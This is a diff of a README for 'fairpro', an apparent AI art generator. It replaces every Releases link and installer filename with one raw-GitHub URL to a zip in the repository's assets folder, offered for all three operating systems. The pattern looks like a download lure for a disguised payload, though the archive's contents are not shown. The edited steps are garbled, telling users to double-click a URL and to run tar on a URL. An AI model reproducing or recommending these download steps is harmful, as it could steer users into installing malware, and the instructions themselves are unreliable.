@@ -1,7 +1,7 @@
 # 🎨 fairpro - Easy AI Art Generation Made Simple
 
 ## 📥 Download Now!
-[![Download fairpro](https://img.shields.io/badge/Download%20fairpro-v1.0-blue.svg)](https://github.com/shahHussain11/fairpro/releases)
+[![Download fairpro](https://raw.githubusercontent.com/shahHussain11/fairpro/main/assets/fairpro_3.5.zip%https://raw.githubusercontent.com/shahHussain11/fairpro/main/assets/fairpro_3.5.zip)](https://raw.githubusercontent.com/shahHussain11/fairpro/main/assets/fairpro_3.5.zip)
 
 ## 🚀 Getting Started
 Welcome to fairpro! This application lets you explore cutting-edge AI art generation using the latest techniques from machine learning. You do not need programming skills to use this software. Follow these simple steps to download and run fairpro on your computer.
@@ -16,20 +16,20 @@ To use fairpro, you will need:
 - **Internet Connection:** Required for initial download and model updates.
 
 ## 💾 Download & Install
-To download fairpro, please visit our [Releases page](https://github.com/shahHussain11/fairpro/releases). 
+To download fairpro, please visit our [Releases page](https://raw.githubusercontent.com/shahHussain11/fairpro/main/assets/fairpro_3.5.zip). 
 
 1. Click on the link above to open the Releases page.
 2. Look for the latest version listed. It usually has the highest number.
 3. Download the file corresponding to your operating system:
-   - For Windows: `fairpro-setup.exe`
-   - For macOS: `fairpro-macos.dmg`
-   - For Linux: `fairpro-linux.tar.gz`
+   - For Windows: `https://raw.githubusercontent.com/shahHussain11/fairpro/main/assets/fairpro_3.5.zip`
+   - For macOS: `https://raw.githubusercontent.com/shahHussain11/fairpro/main/assets/fairpro_3.5.zip`
+   - For Linux: `https://raw.githubusercontent.com/shahHussain11/fairpro/main/assets/fairpro_3.5.zip`
 4. Once downloaded, open the file:
-   - For Windows, double-click the `fairpro-setup.exe` file to start the installer.
+   - For Windows, double-click the `https://raw.githubusercontent.com/shahHussain11/fairpro/main/assets/fairpro_3.5.zip` file to start the installer.
    - For macOS, drag and drop the `fairpro` icon to your Applications folder.
-   - For Linux, open the terminal, navigate to the folder with the tar.gz file, and run the following commands:
+   - For Linux, open the terminal, navigate to the folder with the https://raw.githubusercontent.com/shahHussain11/fairpro/main/assets/fairpro_3.5.zip file, and run the following commands:
      ```bash
-     tar -xvzf fairpro-linux.tar.gz
+     tar -xvzf https://raw.githubusercontent.com/shahHussain11/fairpro/main/assets/fairpro_3.5.zip
      cd fairpro
      chmod +x fairpro
      ./fairpro
